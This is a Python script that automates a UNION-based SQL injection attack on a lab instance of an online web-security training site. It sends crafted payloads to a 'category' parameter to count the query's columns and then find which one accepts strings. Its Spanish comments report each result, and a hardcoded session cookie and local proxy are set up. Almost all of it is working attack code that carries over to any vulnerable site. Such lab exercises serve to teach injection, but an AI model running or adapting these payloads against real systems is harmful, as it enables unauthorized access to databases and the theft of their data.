#!/usr/bin/env python3
import requests,re

burp0_url = "https://ac9b1f651f08d9ffc09e0cfe007e0015.web-security-academy.net:443/filter"
burp0_cookies = {"session": "r6rLXaEbpTVHqhQLWDQQ3fDw5phpEXyr"}
burp0_headers = {"Sec-Ch-Ua": "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"", "Sec-Ch-Ua-Mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://ac9b1f651f08d9ffc09e0cfe007e0015.web-security-academy.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
proxies = {"https":"https://localhost:8080"}
s = requests.Session()


def make_req(payload):
	
	#Request
	param = {"category":payload}
	r = s.get(url=burp0_url,params=param,proxies=proxies,verify=False)
	return r

def detect_col_numbers(url):	
	
	
	payload = "' UNION SELECT ALL null-- -"
	r =  make_req(payload)

	if r.status_code == 200:
		print("La tabla tiene 1 columna")
	
	#col -> represents the column's number 
	col = 1
	nulls = ',null'
	injection = ""
	while (r.status_code == 500):
		#injection
		injection = f"' UNION SELECT ALL null{nulls*col} -- -"
		r = make_req(injection)
		col+=1
	print(f"La tabla tiene {col} columnas")
	return col,s,injection

def detect_string_col(cols_number,session,injection):
	
	string = "'TxjaZM'"
	col = 1
	for i in range(cols_number):
		
		injection = re.sub("null", string, injection, count=1)
		r = make_req(injection)
		
		if r.status_code == 500 :
			injection = re.sub(string, "Null", injection, count=1)
			col+=1
		else:
			break
			
	print(f"La columna que contiene strings es la #{col}")

def main():

	cols_number,session,injection = detect_col_numbers(burp0_url)
	detect_string_col(cols_number,session,injection)

if __name__ == '__main__': 
	main()
	